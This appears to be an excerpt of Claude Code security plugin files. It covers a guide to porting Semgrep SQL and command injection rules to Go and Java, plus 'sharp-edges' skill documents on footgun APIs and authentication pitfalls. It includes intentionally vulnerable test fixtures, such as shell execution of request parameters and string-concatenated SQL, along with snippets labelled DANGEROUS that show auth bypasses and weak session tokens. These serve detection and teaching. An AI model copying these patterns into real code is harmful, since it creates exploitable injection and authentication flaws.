`pattern-sinks` - if taint analysis mode used)\n- **Sanitizers**: sanitize(...) (via `pattern-sanitizers` - optional, if taint analysis used)\n\n### Step 1.2: Analyze for Target Language\n\nFor each target language, determine applicability.\n\nSee [applicability-analysis.md]({baseDir}/references/applicability-analysis.md) for detailed guidance.\n\n### Step 1.3: Document Verdict\n\n```\nTARGET: golang\nVERDICT: APPLICABLE\nREASONING: SQL injection applies to Go. database/sql package provides\nQuery/Exec functions that can be vulnerable to injection when string\nconcatenation is used instead of parameterized queries.\nEQUIVALENT_CONSTRUCTS:\n  - Source: request.args.get  r.URL.Query().Get(), r.FormValue()\n  - Sink: cursor.execute  db.Query(), db.Exec()\n```\n\nIf `NOT_APPLICABLE`, document why and proceed to next target language.\n\n## Phase 2: Test Creation\n\n### Step 2.1: Create Directory Structure\n\n```bash\nmkdir <original-rule-id>-<language>\n```\n\nExample:\n```bash\nmkdir python-sql-injection-golang\n```\n\n### Step 2.2: Write Test File\n\nCreate test file with target language extension:\n\n```go\n// python-sql-injection-golang.go\npackage main\n\nimport (\n    \"database/sql\"\n    \"net/http\"\n)\n\n// Vulnerable cases - MUST be flagged\nfunc vulnerable1(db *sql.DB, r *http.Request) {\n    userID := r.URL.Query().Get(\"id\")\n    // ruleid: python-sql-injection-golang\n    db.Query(\"SELECT * FROM users WHERE id = \" + userID)\n}\n\nfunc vulnerable2(db *sql.DB, r *http.Request) {\n    name := r.FormValue(\"name\")\n    // ruleid: python-sql-injection-golang\n    db.Exec(\"DELETE FROM users WHERE name = '\" + name + \"'\")\n}\n\n// Safe cases - must NOT be flagged\nfunc safeParameterized(db *sql.DB, r *http.Request) {\n    userID := r.URL.Query().Get(\"id\")\n    // ok: python-sql-injection-golang\n    db.Query(\"SELECT * FROM users WHERE id = ?\", userID)\n}\n\nfunc safeHardcoded(db *sql.DB) {\n    // ok: python-sql-injection-golang\n    db.Query(\"SELECT * FROM users WHERE id = 1\")\n}\n```\n\n### Step 2.3: Test Case Requirements\n\n**Minimum cases:**\n- 2+ vulnerable cases (`ruleid:`)\n- 2+ safe cases (`ok:`)\n\n**Include variations:**\n- Different sink functions (Query, Exec, QueryRow)\n- Different source patterns (URL params, form values)\n- Different string construction (concatenation, fmt.Sprintf)\n- Safe patterns (parameterized queries, hardcoded values)\n\n### Step 2.4: Annotation Placement\n\n**CRITICAL**: The annotation comment must be on the line IMMEDIATELY BEFORE the code:\n\n```go\n// ruleid: my-rule\nvulnerableCode()  // This line gets flagged\n\n// ok: my-rule\nsafeCode()  // This line must NOT be flagged\n```\n\n## Phase 3: Rule Creation\n\n### Step 3.1: Analyze AST\n\n```bash\nsemgrep --dump-ast -l go python-sql-injection-golang.go\n```\n\nStudy the AST structure for:\n- How function calls are represented\n- How string concatenation appears\n- How method calls are structured\n\n### Step 3.2: Write the Rule\n\nCreate rule file with adapted patterns:\n\n```yaml\n# python-sql-injection-golang.yaml\nrules:\n  - id: python-sql-injection-golang\n    mode: taint\n    languages: [go]\n    severity: ERROR\n    message: >-\n      SQL injection vulnerability. User input from $SOURCE flows to\n      database query without sanitization.\n    metadata:\n      original-rule: python-sql-injection\n      ported-from: python\n    pattern-sources:\n      - patterns:\n          - pattern: $R.URL.Query().Get(...)\n      - patterns:\n          - pattern: $R.FormValue(...)\n    pattern-sinks:\n      - patterns:\n          - pattern: $DB.Query($QUERY, ...)\n          - focus-metavariable: $QUERY\n      - patterns:\n          - pattern: $DB.Exec($QUERY, ...)\n          - focus-metavariable: $QUERY\n      - patterns:\n          - pattern: $DB.QueryRow($QUERY, ...)\n          - focus-metavariable: $QUERY\n```\n\n### Step 3.3: Update Metadata\n\nFor each ported rule:\n- **id**: Append `-<language>` to original ID\n- **languages**: Change to target language\n- **message**: Adapt if needed for language context\n- **metadata**: Add `original-rule` and `ported-from` fields\n\n### Step 3.4: Adapt Pattern Syntax\n\nSee [language-syntax-guide.md]({baseDir}/references/language-syntax-guide.md) for translation guidance.\n\n## Phase 4: Validation\n\n### Step 4.1: Validate YAML\n\n```bash\nsemgrep --validate --config python-sql-injection-golang.yaml\n```\n\nFix any syntax errors before proceeding.\n\n### Step 4.2: Run Tests\n\n```bash\nsemgrep --test --config python-sql-injection-golang.yaml python-sql-injection-golang.go\n```\n\n### Step 4.3: Check Results\n\n**Success:**\n```\n1/1:  All tests passed\n```\n\n**Failure - missed lines:**\n```\n python-sql-injection-golang\n  missed lines: [15, 22]\n```\n\nRule didn't match when it should. Check:\n- Pattern too specific\n- Missing pattern variant\n- AST structure mismatch\n\n**Failure - incorrect lines:**\n```\n python-sql-injection-golang\n  incorrect lines: [30, 35]\n```\n\nRule matched when it shouldn't. Check:\n- Pattern too broad\n- Need pattern-not exclusion\n- Sanitizer pattern missing\n\n### Step 4.4: Debug Taint Rules\n\nIf using taint mode and having issues:\n\n```bash\nsemgrep --dataflow-traces -f python-sql-injection-golang.yaml python-sql-injection-golang.go\n```\n\nShows:\n- Where taint originates\n- How taint propagates\n- Where taint reaches sinks\n- Why taint might not flow (sanitizers, breaks in flow)\n\n### Step 4.5: Iterate Until Pass\n\nRepeat phases 2-4 as needed:\n1. Add test cases to cover edge cases\n2. Adjust patterns to match/exclude correctly\n3. Re-run tests\n4. Continue until \"All tests passed\"\n\n## Phase 5: Proceed to Next Language\n\nOnly after all tests pass for one language:\n1. Document completion\n2. Move to next target language\n3. Start fresh at Phase 1\n\n## Output Structure\n\nAfter completing all target languages:\n\n```\npython-sql-injection-golang/\n python-sql-injection-golang.yaml\n python-sql-injection-golang.go\n\npython-sql-injection-java/\n python-sql-injection-java.yaml\n python-sql-injection-java.java\n\n# If a language was NOT_APPLICABLE, no directory is created\n# Document the reason in your response\n```\n\n## Troubleshooting\n\n### Pattern Not Matching\n\n1. **Dump AST**: `semgrep --dump-ast -l <lang> file`\n2. **Compare structure**: Your pattern vs actual AST\n3. **Check metavariables**: Correct binding?\n4. **Try broader pattern**: Then narrow down\n\n### Taint Not Propagating\n\n1. **Use --dataflow-traces**: See where taint stops\n2. **Check sanitizers**: Too broad?\n3. **Verify sources**: Pattern actually matching?\n4. **Check focus-metavariable**: On correct part of sink?\n\n### Too Many False Positives\n\n1. **Add pattern-not**: Exclude safe patterns\n2. **Add sanitizers**: Validation functions\n3. **Use pattern-inside**: Limit scope\n4. **Check safe test cases**: Are they actually safe?\n\n### YAML Syntax Errors\n\n1. **Run --validate**: Get specific error\n2. **Check indentation**: YAML is whitespace-sensitive\n3. **Quote strings**: If they contain special characters\n4. **Use multiline**: For complex patterns (`|` or `>-`)\n\n## Example: Complete Workflow\n\n### Original Rule\n\n```yaml\n# python-command-injection.yaml\nrules:\n  - id: python-command-injection\n    mode: taint\n    languages: [python]\n    severity: ERROR\n    message: Command injection vulnerability\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: os.system(...)\n      - pattern: subprocess.call($CMD, shell=True, ...)\n    pattern-sanitizers:\n      - pattern: shlex.quote(...)\n```\n\n### Target Languages: Go and Java\n\n---\n\n### Go Variant\n\n**Phase 1: Applicability**\n```\nTARGET: Go\nVERDICT: APPLICABLE\nREASONING: Command injection applies. Go's os/exec package can execute\ncommands. When user input is passed to exec.Command or wrapped in shell\nexecution, it's vulnerable.\n```\n\n**Phase 2: Test File** (`python-command-injection-golang.go`)\n```go\npackage main\n\nimport (\n    \"net/http\"\n    \"os/exec\"\n)\n\nfunc vulnerable1(r *http.Request) {\n    cmd := r.URL.Query().Get(\"cmd\")\n    // ruleid: python-command-injection-golang\n    exec.Command(\"bash\", \"-c\", cmd).Run()\n}\n\nfunc vulnerable2(r *http.Request) {\n    input := r.FormValue(\"input\")\n    // ruleid: python-command-injection-golang\n    exec.Command(\"sh\", \"-c\", input).Run()\n}\n\nfunc safeNoShell(r *http.Request) {\n    arg := r.URL.Query().Get(\"arg\")\n    // ok: python-command-injection-golang\n    exec.Command(\"echo\", arg).Run()\n}\n\nfunc safeHardcoded() {\n    // ok: python-command-injection-golang\n    exec.Command(\"ls\", \"-la\").Run()\n}\n```\n\n**Phase 3: Rule** (`python-command-injection-golang.yaml`)\n```yaml\nrules:\n  - id: python-command-injection-golang\n    mode: taint\n    languages: [go]\n    severity: ERROR\n    message: Command injection via shell execution\n    metadata:\n      original-rule: python-command-injection\n      ported-from: python\n    pattern-sources:\n      - pattern: $R.URL.Query().Get(...)\n      - pattern: $R.FormValue(...)\n    pattern-sinks:\n      - patterns:\n          - pattern: exec.Command(\"bash\", \"-c\", $CMD, ...)\n          - focus-metavariable: $CMD\n      - patterns:\n          - pattern: exec.Command(\"sh\", \"-c\", $CMD, ...)\n          - focus-metavariable: $CMD\n```\n\n**Phase 4: Validate**\n```bash\nsemgrep --validate --config python-command-injection-golang.yaml\nsemgrep --test --config python-command-injection-golang.yaml python-command-injection-golang.go\n# Output:  All tests passed\n```\n\n---\n\n### Java Variant\n\n**Phase 1: Applicability**\n```\nTARGET: Java\nVERDICT: APPLICABLE\nREASONING: Command injection applies. Java's Runtime.exec() and\nProcessBuilder can execute commands. User input passed directly is vulnerable.\n```\n\n**Phase 2: Test File** (`python-command-injection-java.java`)\n```java\nimport javax.servlet.http.*;\nimport java.io.*;\n\npublic class CommandTest {\n    // ruleid: python-command-injection-java\n    public void vulnerable1(HttpServletRequest request) throws Exception {\n        String cmd = request.getParameter(\"cmd\");\n        Runtime.getRuntime().exec(cmd);\n    }\n\n    // ruleid: python-command-injection-java\n    public void vulnerable2(HttpServletRequest request) throws Exception {\n        String cmd = request.getParameter(\"cmd\");\n        new ProcessBuilder(cmd).start();\n    }\n\n    // ok: python-command-injection-java\n    public void safeHardcoded() throws Exception {\n        Runtime.getRuntime().exec(\"ls -la\");\n    }\n\n    // ok: python-command-injection-java\n    public void safeArray(HttpServletRequest request) throws Exception {\n        String arg = request.getParameter(\"arg\");\n        Runtime.getRuntime().exec(new String[]{\"echo\", arg});\n    }\n}\n```\n\n**Phase 3: Rule** (`python-command-injection-java.yaml`)\n```yaml\nrules:\n  - id: python-command-injection-java\n    mode: taint\n    languages: [java]\n    severity: ERROR\n    message: Command injection vulnerability\n    metadata:\n      original-rule: python-command-injection\n      ported-from: python\n    pattern-sources:\n      - pattern: (HttpServletRequest $REQ).getParameter(...)\n    pattern-sinks:\n      - pattern: Runtime.getRuntime().exec($CMD)\n        focus-metavariable: $CMD\n      - patterns:\n          - pattern: new ProcessBuilder($CMD, ...).start()\n          - focus-metavariable: $CMD\n```\n\n**Phase 4: Validate**\n```bash\nsemgrep --validate --config python-command-injection-java.yaml\nsemgrep --test --config python-command-injection-java.yaml python-command-injection-java.java\n# Output:  All tests passed\n```\n\n---\n\n### Final Output\n\n```\npython-command-injection-golang/\n python-command-injection-golang.yaml\n python-command-injection-golang.go\n\npython-command-injection-java/\n python-command-injection-java.yaml\n python-command-injection-java.java\n```\n",
        "plugins/sharp-edges/.claude-plugin/plugin.json": "{\n  \"name\": \"sharp-edges\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Identify error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes\",\n  \"author\": {\n    \"name\": \"Trail of Bits\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/sharp-edges/README.md": "# Sharp Edges\n\nIdentifies error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes through developer confusion, laziness, or malice.\n\n## When to Use\n\n- Reviewing API designs for security-relevant interfaces\n- Auditing configuration schemas that expose security choices\n- Evaluating cryptographic library ergonomics\n- Assessing authentication/authorization APIs\n- Any code review where developers make security-critical decisions\n\n## What It Does\n\nAnalyzes code and designs through the lens of three adversaries:\n\n1. **The Scoundrel**: Can a malicious developer or attacker disable security via configuration?\n2. **The Lazy Developer**: Will copy-pasting the first example lead to insecure code?\n3. **The Confused Developer**: Can parameters be swapped without type errors?\n\n## Core Principle\n\n**The pit of success**: Secure usage should be the path of least resistance. If developers must read documentation carefully or remember special rules to avoid vulnerabilities, the API has failed.\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/sharp-edges\n```\n\n## Sharp Edge Categories\n\nThe skill identifies six categories of misuse-prone designs:\n\n| Category | Example |\n|----------|---------|\n| Algorithm Selection | JWT `alg: none` attack; PHP `hash(\"crc32\", $password)` |\n| Dangerous Defaults | `session_timeout: 0` meaning infinite; empty password accepted |\n| Primitive vs. Semantic APIs | `encrypt(msg, bytes, bytes)` where key/nonce can be swapped |\n| Configuration Cliffs | `verify_ssl: false` disables all certificate validation |\n| Silent Failures | Verification returns `False` instead of throwing; ignored return values |\n| Stringly-Typed Security | Permissions as comma-separated strings; SQL from concatenation |\n\n## Related Skills\n\n- [constant-time-analysis](../constant-time-analysis) - Detect timing side-channels in cryptographic code\n- [differential-review](../differential-review) - Security-focused code change review\n- [audit-context-building](../audit-context-building) - Deep architectural analysis before auditing\n",
        "plugins/sharp-edges/skills/sharp-edges/SKILL.md": "---\nname: sharp-edges\ndescription: \"Identifies error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes. Use when reviewing API designs, configuration schemas, cryptographic library ergonomics, or evaluating whether code follows 'secure by default' and 'pit of success' principles. Triggers: footgun, misuse-resistant, secure defaults, API usability, dangerous configuration.\"\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n---\n\n# Sharp Edges Analysis\n\nEvaluates whether APIs, configurations, and interfaces are resistant to developer misuse. Identifies designs where the \"easy path\" leads to insecurity.\n\n## When to Use\n\n- Reviewing API or library design decisions\n- Auditing configuration schemas for dangerous options\n- Evaluating cryptographic API ergonomics\n- Assessing authentication/authorization interfaces\n- Reviewing any code that exposes security-relevant choices to developers\n\n## When NOT to Use\n\n- Implementation bugs (use standard code review)\n- Business logic flaws (use domain-specific analysis)\n- Performance optimization (different concern)\n\n## Core Principle\n\n**The pit of success**: Secure usage should be the path of least resistance. If developers must understand cryptography, read documentation carefully, or remember special rules to avoid vulnerabilities, the API has failed.\n\n## Rationalizations to Reject\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"It's documented\" | Developers don't read docs under deadline pressure | Make the secure choice the default or only option |\n| \"Advanced users need flexibility\" | Flexibility creates footguns; most \"advanced\" usage is copy-paste | Provide safe high-level APIs; hide primitives |\n| \"It's the developer's responsibility\" | Blame-shifting; you designed the footgun | Remove the footgun or make it impossible to misuse |\n| \"Nobody would actually do that\" | Developers do everything imaginable under pressure | Assume maximum developer confusion |\n| \"It's just a configuration option\" | Config is code; wrong configs ship to production | Validate configs; reject dangerous combinations |\n| \"We need backwards compatibility\" | Insecure defaults can't be grandfather-claused | Deprecate loudly; force migration |\n\n## Sharp Edge Categories\n\n### 1. Algorithm/Mode Selection Footguns\n\nAPIs that let developers choose algorithms invite choosing wrong ones.\n\n**The JWT Pattern** (canonical example):\n- Header specifies algorithm: attacker can set `\"alg\": \"none\"` to bypass signatures\n- Algorithm confusion: RSA public key used as HMAC secret when switching RS256HS256\n- Root cause: Letting untrusted input control security-critical decisions\n\n**Detection patterns:**\n- Function parameters like `algorithm`, `mode`, `cipher`, `hash_type`\n- Enums/strings selecting cryptographic primitives\n- Configuration options for security mechanisms\n\n**Example - PHP password_hash allowing weak algorithms:**\n```php\n// DANGEROUS: allows crc32, md5, sha1\npassword_hash($password, PASSWORD_DEFAULT); // Good - no choice\nhash($algorithm, $password); // BAD: accepts \"crc32\"\n```\n\n### 2. Dangerous Defaults\n\nDefaults that are insecure, or zero/empty values that disable security.\n\n**The OTP Lifetime Pattern:**\n```python\n# What happens when lifetime=0?\ndef verify_otp(code, lifetime=300):  # 300 seconds default\n    if lifetime == 0:\n        return True  # OOPS: 0 means \"accept all\"?\n        # Or does it mean \"expired immediately\"?\n```\n\n**Detection patterns:**\n- Timeouts/lifetimes that accept 0 (infinite? immediate expiry?)\n- Empty strings that bypass checks\n- Null values that skip validation\n- Boolean defaults that disable security features\n- Negative values with undefined semantics\n\n**Questions to ask:**\n- What happens with `timeout=0`? `max_attempts=0`? `key=\"\"`?\n- Is the default the most secure option?\n- Can any default value disable security entirely?\n\n### 3. Primitive vs. Semantic APIs\n\nAPIs that expose raw bytes instead of meaningful types invite type confusion.\n\n**The Libsodium vs. Halite Pattern:**\n\n```php\n// Libsodium (primitives): bytes are bytes\nsodium_crypto_box($message, $nonce, $keypair);\n// Easy to: swap nonce/keypair, reuse nonces, use wrong key type\n\n// Halite (semantic): types enforce correct usage\nCrypto::seal($message, new EncryptionPublicKey($key));\n// Wrong key type = type error, not silent failure\n```\n\n**Detection patterns:**\n- Functions taking `bytes`, `string`, `[]byte` for distinct security concepts\n- Parameters that could be swapped without type errors\n- Same type used for keys, nonces, ciphertexts, signatures\n\n**The comparison footgun:**\n```go\n// Timing-safe comparison looks identical to unsafe\nif hmac == expected { }           // BAD: timing attack\nif hmac.Equal(mac, expected) { }  // Good: constant-time\n// Same types, different security properties\n```\n\n### 4. Configuration Cliffs\n\nOne wrong setting creates catastrophic failure, with no warning.\n\n**Detection patterns:**\n- Boolean flags that disable security entirely\n- String configs that aren't validated\n- Combinations of settings that interact dangerously\n- Environment variables that override security settings\n- Constructor parameters with sensible defaults but no validation (callers can override with insecure values)\n\n**Examples:**\n```yaml\n# One typo = disaster\nverify_ssl: fasle  # Typo silently accepted as truthy?\n\n# Magic values\nsession_timeout: -1  # Does this mean \"never expire\"?\n\n# Dangerous combinations accepted silently\nauth_required: true\nbypass_auth_for_health_checks: true\nhealth_check_path: \"/\"  # Oops\n```\n\n```php\n// Sensible default doesn't protect against bad callers\npublic function __construct(\n    public string $hashAlgo = 'sha256',  // Good default...\n    public int $otpLifetime = 120,       // ...but accepts md5, 0, etc.\n) {}\n```\n\nSee [config-patterns.md](references/config-patterns.md#unvalidated-constructor-parameters) for detailed patterns.\n\n### 5. Silent Failures\n\nErrors that don't surface, or success that masks failure.\n\n**Detection patterns:**\n- Functions returning booleans instead of throwing on security failures\n- Empty catch blocks around security operations\n- Default values substituted on parse errors\n- Verification functions that \"succeed\" on malformed input\n\n**Examples:**\n```python\n# Silent bypass\ndef verify_signature(sig, data, key):\n    if not key:\n        return True  # No key = skip verification?!\n\n# Return value ignored\nsignature.verify(data, sig)  # Throws on failure\ncrypto.verify(data, sig)     # Returns False on failure\n# Developer forgets to check return value\n```\n\n### 6. Stringly-Typed Security\n\nSecurity-critical values as plain strings enable injection and confusion.\n\n**Detection patterns:**\n- SQL/commands built from string concatenation\n- Permissions as comma-separated strings\n- Roles/scopes as arbitrary strings instead of enums\n- URLs constructed by joining strings\n\n**The permission accumulation footgun:**\n```python\npermissions = \"read,write\"\npermissions += \",admin\"  # Too easy to escalate\n\n# vs. type-safe\npermissions = {Permission.READ, Permission.WRITE}\npermissions.add(Permission.ADMIN)  # At least it's explicit\n```\n\n## Analysis Workflow\n\n### Phase 1: Surface Identification\n\n1. **Map security-relevant APIs**: authentication, authorization, cryptography, session management, input validation\n2. **Identify developer choice points**: Where can developers select algorithms, configure timeouts, choose modes?\n3. **Find configuration schemas**: Environment variables, config files, constructor parameters\n\n### Phase 2: Edge Case Probing\n\nFor each choice point, ask:\n- **Zero/empty/null**: What happens with `0`, `\"\"`, `null`, `[]`?\n- **Negative values**: What does `-1` mean? Infinite? Error?\n- **Type confusion**: Can different security concepts be swapped?\n- **Default values**: Is the default secure? Is it documented?\n- **Error paths**: What happens on invalid input? Silent acceptance?\n\n### Phase 3: Threat Modeling\n\nConsider three adversaries:\n\n1. **The Scoundrel**: Actively malicious developer or attacker controlling config\n   - Can they disable security via configuration?\n   - Can they downgrade algorithms?\n   - Can they inject malicious values?\n\n2. **The Lazy Developer**: Copy-pastes examples, skips documentation\n   - Will the first example they find be secure?\n   - Is the path of least resistance secure?\n   - Do error messages guide toward secure usage?\n\n3. **The Confused Developer**: Misunderstands the API\n   - Can they swap parameters without type errors?\n   - Can they use the wrong key/algorithm/mode by accident?\n   - Are failure modes obvious or silent?\n\n### Phase 4: Validate Findings\n\nFor each identified sharp edge:\n\n1. **Reproduce the misuse**: Write minimal code demonstrating the footgun\n2. **Verify exploitability**: Does the misuse create a real vulnerability?\n3. **Check documentation**: Is the danger documented? (Documentation doesn't excuse bad design, but affects severity)\n4. **Test mitigations**: Can the API be used safely with reasonable effort?\n\nIf a finding seems questionable, return to Phase 2 and probe more edge cases.\n\n## Severity Classification\n\n| Severity | Criteria | Examples |\n|----------|----------|----------|\n| Critical | Default or obvious usage is insecure | `verify: false` default; empty password allowed |\n| High | Easy misconfiguration breaks security | Algorithm parameter accepts \"none\" |\n| Medium | Unusual but possible misconfiguration | Negative timeout has unexpected meaning |\n| Low | Requires deliberate misuse | Obscure parameter combination |\n\n## References\n\n**By category:**\n\n- **Cryptographic APIs**: See [references/crypto-apis.md](references/crypto-apis.md)\n- **Configuration Patterns**: See [references/config-patterns.md](references/config-patterns.md)\n- **Authentication/Session**: See [references/auth-patterns.md](references/auth-patterns.md)\n- **Real-World Case Studies**: See [references/case-studies.md](references/case-studies.md) (OpenSSL, GMP, etc.)\n\n**By language** (general footguns, not crypto-specific):\n\n| Language | Guide |\n|----------|-------|\n| C/C++ | [references/lang-c.md](references/lang-c.md) |\n| Go | [references/lang-go.md](references/lang-go.md) |\n| Rust | [references/lang-rust.md](references/lang-rust.md) |\n| Swift | [references/lang-swift.md](references/lang-swift.md) |\n| Java | [references/lang-java.md](references/lang-java.md) |\n| Kotlin | [references/lang-kotlin.md](references/lang-kotlin.md) |\n| C# | [references/lang-csharp.md](references/lang-csharp.md) |\n| PHP | [references/lang-php.md](references/lang-php.md) |\n| JavaScript/TypeScript | [references/lang-javascript.md](references/lang-javascript.md) |\n| Python | [references/lang-python.md](references/lang-python.md) |\n| Ruby | [references/lang-ruby.md](references/lang-ruby.md) |\n\nSee also [references/language-specific.md](references/language-specific.md) for a combined quick reference.\n\n## Quality Checklist\n\nBefore concluding analysis:\n\n- [ ] Probed all zero/empty/null edge cases\n- [ ] Verified defaults are secure\n- [ ] Checked for algorithm/mode selection footguns\n- [ ] Tested type confusion between security concepts\n- [ ] Considered all three adversary types\n- [ ] Verified error paths don't bypass security\n- [ ] Checked configuration validation\n- [ ] Constructor params validated (not just defaulted) - see [config-patterns.md](references/config-patterns.md#unvalidated-constructor-parameters)\n",
        "plugins/sharp-edges/skills/sharp-edges/references/auth-patterns.md": "# Authentication & Session Footguns\n\nPatterns that make authentication and session management error-prone.\n\n## Password Handling\n\n### Comparison Vulnerabilities\n\n```python\n# DANGEROUS: Short-circuit evaluation\ndef check_password(user_input, stored):\n    return user_input == stored  # Timing attack\n\n# DANGEROUS: Empty password bypass\ndef check_password(user_input, stored):\n    if not stored:\n        return True  # No password set = access granted?\n    return constant_time_compare(user_input, stored)\n\n# DANGEROUS: Null bypass\ndef authenticate(username, password):\n    user = get_user(username)\n    if user is None:\n        return None  # No user = return None\n    if password == user.password:  # None == None if both None\n        return user\n```\n\n### Length Limits That Truncate\n\n```python\n# DANGEROUS: Password truncated before hashing\ndef hash_password(password: str) -> str:\n    password = password[:72]  # bcrypt limit\n    return bcrypt.hash(password)\n\n# User sets: \"password123\" + 64 more characters + \"IMPORTANT_ENTROPY\"\n# Stored: hash of just \"password123\" + first 61 characters\n# Attacker only needs to brute force truncated version\n```\n\n**Fix**: Reject passwords over limit; don't silently truncate.\n\n### Validation Ordering\n\n```python\n# DANGEROUS: Username enumeration\ndef login(username, password):\n    user = db.get_user(username)\n    if not user:\n        return \"User not found\"  # Reveals user doesn't exist\n    if not verify_password(password, user.password_hash):\n        return \"Wrong password\"  # Reveals user DOES exist\n    return create_session(user)\n\n# SECURE: Uniform error\ndef login(username, password):\n    user = db.get_user(username)\n    if not user or not verify_password(password, user.password_hash):\n        return \"Invalid credentials\"\n    return create_session(user)\n```\n\n## Session Management\n\n### Session Fixation Enablers\n\n```python\n# DANGEROUS: Session ID accepted from request\ndef login(request):\n    session_id = request.cookies.get(\"session\") or generate_session_id()\n    # Attacker gives victim a known session ID before login\n    # After login, attacker knows victim's session\n    sessions[session_id] = user\n```\n\n**Fix**: Always generate new session ID on authentication state change.\n\n### Token Generation Weakness\n\n```python\n# DANGEROUS: Predictable tokens\nimport time\nsession_id = hashlib.md5(str(time.time()).encode()).hexdigest()\n# Attacker knows approximate login time = can guess session\n\n# DANGEROUS: Insufficient entropy\nsession_id = ''.join(random.choice('abcdef') for _ in range(8))\n# Only 6^8 = 1.6M possibilities\n\n# SECURE: Cryptographic randomness\nsession_id = secrets.token_urlsafe(32)\n```\n\n### Session Timeout Footguns\n\n```python\n# DANGEROUS: Timeout of 0 means \"never\"?\nclass SessionConfig:\n    timeout_seconds: int = 3600  # 1 hour\n    # What if someone sets 0? Infinite session?\n\n# DANGEROUS: Negative timeout\nif current_time - session_created > timeout:\n    # If timeout is negative, this is always False\n    # Session never expires\n```\n\n## Token/OTP Handling\n\n### OTP Lifetime Issues\n\n```python\n# DANGEROUS: lifetime=0 accepts all\ndef verify_otp(code, user, lifetime=300):\n    if lifetime == 0:\n        return True  # Skip expiry check entirely\n\n# DANGEROUS: Negative lifetime\n    if otp.created_at + lifetime > current_time:\n        return True\n    # If lifetime is negative, always expired? Or underflow?\n\n# DANGEROUS: No rate limiting\ndef verify_otp(code, user):\n    return code == user.current_otp\n    # Attacker can try all 1,000,000 6-digit codes\n```\n\n### Token Reuse\n\n```python\n# DANGEROUS: OTP valid until next OTP generated\ndef verify_otp(code, user):\n    return code == user.otp\n\n# DANGEROUS: Reset token valid forever\ndef verify_reset_token(token):\n    return token in valid_tokens\n    # Never expires, never invalidated on use\n\n# SECURE: Single-use, time-limited\ndef verify_reset_token(token):\n    record = db.get_token(token)\n    if not record:\n        return False\n    if record.used or record.expired:\n        return False\n    record.mark_used()  # Invalidate immediately\n    return True\n```\n\n## Authorization Footguns\n\n### Role/Permission Accumulation\n\n```python\n# DANGEROUS: String-based permissions\nuser.permissions = \"read,write\"\nuser.permissions += \",admin\"  # Too easy\n\n# DANGEROUS: Any-match logic\ndef has_permission(user, required):\n    return any(p in user.permissions for p in required.split(\",\"))\n# has_permission(user, \"admin,readonly\") - matches if ANY is present\n\n# DANGEROUS: Substring matching\nif \"admin\" in user.role:\n    grant_admin_access()\n# \"readonly_admin_viewer\" contains \"admin\"\n```\n\n### Missing Authorization Checks\n\n```python\n# DANGEROUS: Auth check in one place, not others\n@require_login\ndef list_documents(request):\n    return Document.objects.all()\n\ndef get_document(request, doc_id):\n    # Developer forgot @require_login\n    return Document.objects.get(id=doc_id)\n\ndef delete_document(request, doc_id):\n    # Developer also forgot authorization check\n    Document.objects.get(id=doc_id).delete()\n```\n\n**Fix**: Centralized authorization; deny-by-default.\n\n### IDOR Enablers\n\n```python\n# DANGEROUS: User ID from request\ndef get_profile(request):\n    user_id = request.GET[\"user_id\"]  # Attacker changes this\n    return User.objects.get(id=user_id)\n\n# DANGEROUS: Sequential IDs\nuser = User.objects.create(...)  # Gets ID 12345\n# Attacker tries 12344, 12346, etc.\n```\n\n## Multi-Factor Authentication\n\n### Bypassable MFA\n\n```python\n# DANGEROUS: MFA check in frontend only\n# API directly accessible without MFA\n\n# DANGEROUS: \"Remember this device\" with weak token\ndevice_token = hashlib.md5(user_agent.encode()).hexdigest()\n# Attacker spoofs User-Agent to bypass MFA\n\n# DANGEROUS: MFA disabled by user preference\nif user.preferences.get(\"mfa_enabled\", True):\n    require_mfa()\n# Preference stored in same session = attacker disables it\n```\n\n### Recovery Code Issues\n\n```python\n# DANGEROUS: Predictable recovery codes\nrecovery_code = str(user.id).zfill(8)  # Just the user ID\n\n# DANGEROUS: Unlimited recovery attempts\nfor _ in range(1000000):\n    try_recovery_code(guess)\n\n# DANGEROUS: Recovery codes don't invalidate\nif code in user.recovery_codes:\n    login(user)\n    # Code still valid for reuse\n```\n\n## Auth API Design Checklist\n\nFor authentication APIs, verify:\n\n- [ ] **Constant-time comparison**: Password/token checks use constant-time compare\n- [ ] **Empty value rejection**: Empty passwords/tokens explicitly rejected\n- [ ] **Uniform errors**: No user enumeration via different error messages\n- [ ] **Session regeneration**: New session ID on auth state changes\n- [ ] **Cryptographic tokens**: secrets module, not random or time-based\n- [ ] **Positive timeouts**: Zero/negative values rejected or have safe meaning\n- [ ] **Single-use tokens**: OTPs/reset tokens invalidated on use\n- [ ] **Rate limiting**: Brute force protection on all auth endpoints\n- [ ] **Authorization centralized**: Not scattered across endpoints\n- [ ] **MFA in backend**: Not bypassable by skipping frontend\n",
        "plugins/sharp-edges/skills/sharp-edges/references/case-studies.md": "# Real-World Case Studies\n\nAnalysis of sharp edges in widely-used libraries. These aren't implementation bugsthey're design decisions that make secure usage difficult.\n\n## GNU Multiple Precision Arithmetic Library (GMP)\n\nGMP is used extensively for cryptographic implementations (RSA, Paillier, ElGamal, etc.) despite being fundamentally unsuitable for cryptography.\n\n### Sharp Edge: Variable-Time Operations\n\n**The Problem**: GMP operations are not constant-time. Timing varies based on input values.\n\n```c\n// DANGEROUS: Timing leaks secret exponent bits\nmpz_powm(result, base, secret_exponent, modulus);\n\n// Each bit of secret_exponent affects timing differently\n// Attacker can recover secret_exponent via timing analysis\n```\n\n**Why This Matters**:\n- Paillier encryption uses `mpz_powm` with secret keys\n- RSA implementations using GMP leak private key bits\n- Even \"blinded\" implementations often have residual timing leaks\n\n**Detection Pattern**: Any use of GMP (`mpz_*` functions) with secret values:\n- `mpz_powm`, `mpz_powm_sec` (the \"sec\" version is still not fully constant-time)\n- `mpz_mul`, `mpz_mod` with secret operands\n- `mpz_cmp` for secret comparison\n\n**Real Vulnerabilities**:\n- CVE-2018-16152: Timing attack on strongSwan IKEv2\n- Numerous academic papers demonstrating key recovery from GMP-based crypto\n\n### Sharp Edge: Memory Not Securely Cleared\n\n```c\nmpz_t 